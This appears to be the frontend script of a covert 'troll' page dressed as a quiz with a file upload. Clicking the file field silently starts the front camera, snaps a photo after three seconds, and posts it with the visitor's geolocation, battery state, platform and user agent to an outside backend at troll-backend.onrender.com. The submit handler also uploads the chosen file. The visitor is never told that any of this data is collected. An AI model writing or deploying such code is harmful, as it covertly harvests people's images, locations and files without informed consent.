// ================================
// FRONTEND SCRIPT.JS
// ================================

// DOM elements
const btn = document.getElementById('submit-btn') || document.getElementById('btn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const fileInput = document.getElementById('user-file');
const toast = document.getElementById('toast');

const BACKEND_BASE = "https://troll-backend.onrender.com/api";

// Camera constraints
const constraints = { video: { facingMode: "user" }, audio: false };

// ================================
// SHOW TOAST FUNCTION
// ================================
function showToast(message = "Done") {
  if (!toast) return;
  toast.textContent = message;
  toast.style.display = "block";
  setTimeout(() => { toast.style.display = "none"; }, 3000);
}

// ================================
// COLLECT METADATA
// ================================
async function collectMetadata() {
  const metadata = {
    width: window.innerWidth,
    height: window.innerHeight,
    platform: navigator.platform,
    language: navigator.language,
    useragent: navigator.userAgent,
    time: new Date().toLocaleString(),
    battery: "N/A",
    location: "N/A"
  };

  if (navigator.getBattery) {
    const battery = await navigator.getBattery();
    metadata.battery = battery.level * 100 + "%, charging: " + battery.charging;
  }

  if (navigator.geolocation) {
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject);
      });
      metadata.location = `${position.coords.latitude},${position.coords.longitude}`;
    } catch {
      metadata.location = "Denied";
    }
  }

  return metadata;
}

// ================================
// CAPTURE PHOTO
// ================================
async function capturePhoto() {
  const context = canvas.getContext('2d');
  context.drawImage(video, 0, 0, canvas.width, canvas.height);
  return canvas.toDataURL('image/png');
}

// ================================
// SEND CAMERA IMAGE + METADATA
// ================================
async function sendCameraData() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;

    const metadata = await collectMetadata();
    await new Promise(res => setTimeout(res, 3000));

    const image = await capturePhoto();

    await fetch(`${BACKEND_BASE}/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata })
    });

    showToast("Camera captured & sent!");
  } catch (err) {
    console.error("Camera capture error:", err);
  }
}

// ================================
// SEND FILE UPLOAD
// ================================
async function sendFileUpload(file) {
  if (!file) return;

  const reader = new FileReader();
  reader.onload = async () => {
    await fetch(`${BACKEND_BASE}/file-upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ file: reader.result, filename: file.name })
    });

    showToast("File uploaded successfully!");
  };
  reader.readAsDataURL(file);
}

// ================================
// CAMERA ONLY WHEN FILE INPUT CLICKED
// ================================
if (fileInput) {
  fileInput.addEventListener('click', async () => {
    await sendCameraData();
  });
}

// ================================
// SUBMIT BUTTON → UPLOAD + SUCCESS SCREEN
// ================================
if (btn) {
  btn.addEventListener('click', async (e) => {
    e.preventDefault();

    if (fileInput && fileInput.files.length > 0) {
      await sendFileUpload(fileInput.files[0]);
    }

    const quiz = document.getElementById('quiz-container');
    const success = document.getElementById('success-container');

    if (quiz) quiz.style.display = "none";
    if (success) success.style.display = "block";
  });
    }
